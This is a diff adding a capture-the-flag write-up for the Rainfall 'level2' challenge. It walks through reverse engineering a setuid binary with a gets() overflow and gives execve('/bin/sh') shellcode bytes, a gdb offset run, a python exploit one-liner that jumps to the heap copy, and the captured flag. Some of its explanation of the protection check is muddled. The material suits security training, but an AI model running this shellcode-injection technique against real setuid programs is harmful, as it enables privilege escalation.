@@ -1,0 +1,124 @@
+# Rainfall Level 2 Guide
+This guide will walk you through the process of finding the password for the `level3` user.
+
+## Procedure
+
+### 1. Examine your environment
+   
+`id` : Shows user and group identities that you have.
+```bash
+uid=2021(level2) gid=2021(level2) groups=2021(level2),100(users)
+`ls -la` : Lists files and their permissions in the current directory.
+```bash
+-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
+```
+
+We can see that the `level2` binary has the `setuid` bit set, which means that it runs with the permissions of the owner of the file. In this case, the owner is `level3`. It executable by the `users` group, our current group.
+
+We execute the binary to see what it does. It waiting for an input, print it after pressing enter, and quit.
+
+```bash
+level2@RainFall:~$ ./level2 
+g
+g
+level2@RainFall:~$ ./level2 
+a
+a
+```
+
+### 2. Reverse engineering
+
+We will use Ghidra to reverse engineer the binary.
+You can find the analysis in [Ressources/ghidra.c](Ressources/ghidra.c), and the reconstructed C code in [source.c](source.c).
+
+### 3. Analysis
+
+We find a main function that calls a function `p()`.
+The `p()` function reads a line from `stdin` into the buffer `buffer` with `gets()`.
+It then checks if the return address is in the `0xb0000000` range.
+Example: `0xb7e5f430 & 0xb0000000 = 0xb0000000`.
+If it is, it will print the return address and exit.
+Else, it will print the buffer with `puts`, and copy the buffer with `strdup`, but the result is not used.
+
+```c
+void p(void)
+{
+    uintptr_t unaff_retaddr;
+	char buffer[76];
+
+	fflush(stdout);
+	gets(buffer);
+	if ((unaff_retaddr & 0xb0000000) == 0xb0000000)
+	{
+		printf("(%p)\n", (void *)unaff_retaddr);
+		exit(1);
+	}
+	puts(buffer);
+    strdup(buffer);
+}
+```
+`fflush(stdout)` ensuring that all data is written to the standard output.
+
+The check `if ((unaff_retaddr & 0xb0000000) == 0xb0000000)` is a security measure to prevent buffer overflow attacks. It protects the `0xb0000000` range from being overwritten. This range is the range of the stack where the return address is stored.
+
+But the program uses `strdup` to copy the buffer, which is a function that allocates memory on the heap. The heap is not protected by the check, so we can overwrite the return address by overflowing the buffer.
+
+### 4. Analysis with ltrace
+
+`ltrace` is a debugging utility in Linux used to display the calls a process makes to shared libraries.
+```bash
+level2@RainFall:~$ ltrace ./level2
+[...]
+fflush(0xb7fd1a20)                                                             = 0
+gets(0xbffff70c, 0, 0, 0xb7e5ec73, 0x80482b5
+)                                  = 0xbffff70c
+puts(""
+)                                                                       = 1
+strdup("")                                                                     = 0x0804a008
++++ exited (status 8) +++
+```
+We can see that the `strdup` function always allocates memory (with `malloc`) at `0x0804a008`.
+
+### 5. Shellcode injection
+
+The shellcode injection is a technique used to exploit a buffer overflow vulnerability. It consists of injecting shellcode into the buffer to execute this code when the program returns.
+
+We will inject a shellcode that will spawn a shell. We will use the following shellcode:
+```c
+execve("/bin/sh")
+```
+In machine language:
+```c
+\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
+```
+
+### 6. EIP overwrite
+
+`EIP` (Extended Instruction Pointer) is a register that contains the address of the next instruction to be executed. It is stored on the stack, and we can overwrite it by overflowing the buffer.
+
+We can imagine that if we manage to send a command, such as: ```execve("/bin/sh")```, the program will run it and allow us to use bash.
+
+We will need a shellcode found [here](https://shell-storm.org/shellcode/files/shellcode-841.html).
+
+Calculate the required offset:
+```bash
+$ gdb ./level2
+(gdb) r
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+```
+
+### 7. Exploitation
+
+Our payload will be: 
+```bash
+shellcode + "a"*(80-21) + "\x08\xa0\x04\x08"
+```
+
+Run:
+```bash
+ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * (80 - 21) + "\x08\xa0\x04\x08"'; cat) | ./level2
+```
+
+And we get our flag: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
